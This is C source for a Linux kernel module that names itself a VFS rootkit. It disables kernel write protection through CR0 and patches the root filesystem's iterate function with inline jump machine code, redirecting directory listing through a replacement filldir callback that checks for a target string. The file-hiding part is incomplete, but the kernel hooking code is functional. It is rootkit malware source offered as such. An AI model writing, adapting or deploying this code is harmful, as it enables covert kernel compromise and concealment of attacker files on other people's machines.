#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");


/*inline function hooking gadget*/

#if defined(__i386__)
#define csize 6 /* code size */
#define jacked_code "\x68\x00\x00\x00\x00\xc3" /* push address, addr, ret */
#define poff 1 /* pointer offset to write address to */
#else
#define csize 12 /* code size */
/* mov address to register rax, jmp rax. for normal x64 convention */
#define jacked_code "\x48\x8b\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define poff 2
#endif
/*-------------------------------*/


/*x86, x64 pointer size*/
//x86 system
#if defined(__i386__)
typedef unsigned int psize;
#else //x64 system
typedef unsigned long psize;
#endif
/*---------------------*/




typedef ssize_t (*type_read) (struct file *file, char __user *buf, size_t count, loff_t *pos);



typedef int (*type_iterate) (struct file* pfile, struct dir_context* pctx);


/*function header*/
static int new_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static void set_addr_ro(void *addr);
static void set_addr_rw(void *addr);
asmlinkage static ssize_t my_read (struct file *file, char __user *buf, size_t count, loff_t *pos);
type_iterate get_vfs_iterate(const char* path);
static int my_iterate (struct file * pfile, struct dir_context * pctx);
asmlinkage void hook(void);
asmlinkage void unhook(void);
void ready_hooking(void);
void dump(void);
/*-------------------------*/






asmlinkage static ssize_t (*org_read) (struct file *file, char __user *buf, size_t count, loff_t *pos);
asmlinkage static int (*org_iterate) (struct file* pfile, struct dir_context* pctx);


/*struct hook related code*/
struct hook_info{
	/*before hooking, data backup*/
	unsigned char back_data[csize];
	unsigned char write_data[csize];
	type_iterate org_pointer;
};




/*global var*/
struct hook_info hinfo;
/*---------*/


asmlinkage static ssize_t my_read (struct file *file, char __user *buf, size_t count, loff_t *pos){


        ssize_t ret ;
      //  unhook();
//	printk("before  org read\n");
        ret = org_read(file, buf, count, pos);
//	printk("after   org read\n");

        //hook();

        return ret;
}


static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}


/*hooking function pointer*/
int rooty_init(void) {



	hinfo.org_pointer = get_vfs_iterate("/");

	printk("iterate pointer : %p\n", hinfo.org_pointer);
	

	
	/*gathering information*/
	ready_hooking();



	dump();
	/*hook*/
	hook();

	
		 
	return 0;
}

void dump(void)
{
	int index = 0;


	printk("code:");
	for(index = 0 ; index < csize;index++)
		printk("%02x",hinfo.write_data[index]);

	printk("\n");
}


void rooty_exit(void) {
 	
unhook();
	printk("vfs rootkit exit\n");
}



void ready_hooking(void)
{


	barrier();


	/*ready to write data*/
	memcpy(hinfo.write_data,jacked_code, csize);
	
	/*write func addr data*/
	*(psize*)&hinfo.write_data[poff] = (psize)my_iterate;

	/*backup data*/	
	memcpy(hinfo.back_data, hinfo.org_pointer, csize);


	barrier();
}


asmlinkage void hook(void)
{


   	barrier();
	
	/*write on*/
        write_cr0(read_cr0() & (~0x10000));

        /*hooking code write*/
        memcpy(hinfo.org_pointer, hinfo.write_data, csize);

        /*write off*/
        write_cr0(read_cr0() | 0x10000);

	barrier();
}


asmlinkage void unhook(void)
{


	barrier();
	
	/*write on*/
        write_cr0(read_cr0() & (~0x10000));

        /*hooking code write*/
        memcpy(hinfo.org_pointer, hinfo.back_data, csize);

        /*write off*/
        write_cr0(read_cr0() | 0x10000);

	barrier();
}


static int new_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	if(strstr(__buf,"jhong")){
		printk("find file");	
	}

	printk("name : %s\n", name);
	return proc_filldir(__buf, name, namelen, offset, ino, d_type);
}


static int my_iterate (struct file *pfile, struct dir_context *pctx){
	
	int ret;
	
	unhook();

	
	printk("In my iterate func!!\n");

	proc_filldir = pctx->actor;

	*((filldir_t *)&pctx->actor) = &new_proc_filldir;

	ret = hinfo.org_pointer(pfile, pctx);


	hook();	

	
	return ret;

}


static void set_addr_ro(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}

type_iterate get_vfs_iterate(const char* path)
{
	/*file structure*/
	struct file* pfile = NULL;
	pfile = filp_open(path, O_RDONLY, 0);
	type_iterate org_iterate;	

	if(pfile == NULL){
		return NULL;
	}


	/*origin iterate pointer*/
	org_iterate = pfile->f_op->iterate;






	filp_close(pfile, 0);
	return org_iterate;

	
}

module_init(rooty_init);
module_exit(rooty_exit);
